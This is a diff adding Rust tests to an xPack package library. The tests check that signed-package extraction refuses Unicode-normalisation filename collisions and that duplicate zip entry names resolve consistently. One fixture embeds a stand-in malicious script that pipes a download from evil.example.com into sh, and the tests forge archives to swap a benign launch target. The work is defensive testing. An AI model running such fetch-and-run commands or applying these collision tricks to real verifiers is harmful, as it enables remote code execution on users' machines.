@@ -456,3 +456,152 @@ fn inspecting_an_untrusted_package_never_requires_a_key() {
     let manifest = PackageReader::open(&pkg).unwrap().peek_manifest_unverified().unwrap();
     assert_eq!(manifest.application.id, "com.example.myapp");
 }
+
+/// Writes an archive from an explicit manifest and entry list, signing the
+/// manifest with `key`.
+///
+/// The ordinary builder walks a real directory, so it cannot express a package
+/// whose entry names collide on the local filesystem. Forging the archive
+/// directly is the only way to reach that code path.
+fn pack_forged(
+    dir: &Path,
+    key: &KeyPair,
+    manifest: &Manifest,
+    entries: &[(&str, &[u8])],
+) -> std::path::PathBuf {
+    use xpack_security::sign;
+
+    let bytes = manifest.to_signed_bytes().unwrap();
+    let signature = sign(key, &bytes);
+
+    let out = dir.join("forged.xpkg");
+    let file = fs::File::create(&out).unwrap();
+    let mut zip = zip::ZipWriter::new(file);
+    let opts =
+        zip::write::SimpleFileOptions::default().compression_method(zip::CompressionMethod::Stored);
+
+    zip.start_file(MANIFEST_ENTRY, opts).unwrap();
+    zip.write_all(&bytes).unwrap();
+    zip.start_file(SIGNATURE_ENTRY, opts).unwrap();
+    zip.write_all(signature.to_hex().as_bytes()).unwrap();
+    for (name, data) in entries {
+        zip.start_file(format!("payload/{name}"), opts).unwrap();
+        zip.write_all(data).unwrap();
+    }
+    zip.finish().unwrap();
+    out
+}
+
+#[test]
+fn payload_entries_that_collide_on_this_filesystem_are_refused() {
+    // Two entry names that are distinct strings but the same file on
+    // normalisation-folding filesystems such as APFS: U+00E9, versus 'e'
+    // followed by the combining acute accent U+0301.
+    const NFC: &str = "caf\u{e9}/run.sh";
+    const NFD: &str = "cafe\u{301}/run.sh";
+    assert_ne!(NFC, NFD, "the two encodings must differ as strings");
+
+    let dir = tempfile::tempdir().unwrap();
+    let key = KeyPair::generate().unwrap();
+
+    let benign: &[u8] = b"#!/bin/sh\necho benign\n";
+    let evil: &[u8] = b"#!/bin/sh\ncurl evil.example.com | sh\n";
+
+    let mut manifest = template(host());
+    // The launch target is the benign entry; the collision is what swaps it.
+    manifest.launch = LaunchSpec {
+        executable: NFC.into(),
+        arguments: vec![],
+        working_directory: None,
+        environment: BTreeMap::new(),
+    };
+    manifest.payload = PayloadSpec {
+        total_size: (benign.len() + evil.len()) as u64,
+        files: vec![
+            xpack_core::PayloadFile {
+                path: NFC.into(),
+                size: benign.len() as u64,
+                sha256: xpack_security::sha256(benign),
+                mode: Some(0o755),
+            },
+            xpack_core::PayloadFile {
+                path: NFD.into(),
+                size: evil.len() as u64,
+                sha256: xpack_security::sha256(evil),
+                mode: Some(0o755),
+            },
+        ],
+    };
+
+    let pkg = pack_forged(dir.path(), &key, &manifest, &[(NFC, benign), (NFD, evil)]);
+    let dest = dir.path().join("extracted");
+    let result =
+        PackageReader::open(&pkg).unwrap().verify(&trusting(&key)).unwrap().extract_to(&dest);
+
+    // On a folding filesystem the second entry would otherwise overwrite the
+    // first, leaving the launch target holding content the manifest attributes
+    // to a different hash. On a non-folding filesystem both files coexist and
+    // extraction legitimately succeeds.
+    let collides = {
+        let probe = dir.path().join("probe");
+        fs::create_dir_all(&probe).unwrap();
+        fs::write(probe.join("caf\u{e9}"), b"a").unwrap();
+        fs::write(probe.join("cafe\u{301}"), b"b").unwrap();
+        fs::read_dir(&probe).unwrap().count() == 1
+    };
+
+    if collides {
+        let err = result.expect_err("a filesystem collision must be refused");
+        assert!(err.is_integrity_failure(), "got {err:?}");
+        assert!(err.to_string().contains("collides"), "got {err}");
+        assert!(!dest.exists(), "a refused extraction must leave nothing behind");
+    } else {
+        result.expect("without folding the two entries are genuinely distinct files");
+        assert_eq!(fs::read(dest.join(NFC)).unwrap(), benign);
+    }
+}
+
+#[test]
+fn the_zip_reader_collapses_duplicate_entry_names_to_the_last() {
+    // xPack relies on this: it verifies the manifest returned by name and
+    // extracts the entries returned by index, and those must be the same view
+    // of the archive. The zip crate deduplicates by name, keeping the last
+    // occurrence, so both agree.
+    //
+    // This test pins that behaviour. If a future version of the zip crate
+    // instead surfaced both entries, or kept the first, the two views could
+    // disagree — and an archive carrying a signed manifest plus an appended
+    // unsigned one could be read differently by verification and extraction.
+    // That is the classic archive parser-differential bug, and this test is
+    // what makes a dependency upgrade fail loudly instead of silently.
+    let mut buf = Vec::new();
+    {
+        let mut w = zip::ZipWriter::new(Cursor::new(&mut buf));
+        let opts = zip::write::SimpleFileOptions::default()
+            .compression_method(zip::CompressionMethod::Stored);
+        w.start_file("manifest.json", opts).unwrap();
+        w.write_all(b"FIRST").unwrap();
+        // Same length, patched to a duplicate name below so every offset stays
+        // valid; the writer itself refuses to emit a duplicate.
+        w.start_file("manifestXjson", opts).unwrap();
+        w.write_all(b"SECOND").unwrap();
+        w.finish().unwrap();
+    }
+    let (needle, repl) = (b"manifestXjson", b"manifest.json");
+    for i in 0..buf.len().saturating_sub(needle.len()) {
+        if &buf[i..i + needle.len()] == needle {
+            buf[i..i + needle.len()].copy_from_slice(repl);
+        }
+    }
+
+    let mut archive = zip::ZipArchive::new(Cursor::new(&buf)).unwrap();
+    assert_eq!(archive.len(), 1, "duplicates must collapse to a single entry");
+
+    let mut by_name = String::new();
+    archive.by_name("manifest.json").unwrap().read_to_string(&mut by_name).unwrap();
+    let mut by_index = String::new();
+    archive.by_index(0).unwrap().read_to_string(&mut by_index).unwrap();
+
+    assert_eq!(by_name, "SECOND", "the last occurrence must win");
+    assert_eq!(by_name, by_index, "name and index views must agree");
+}
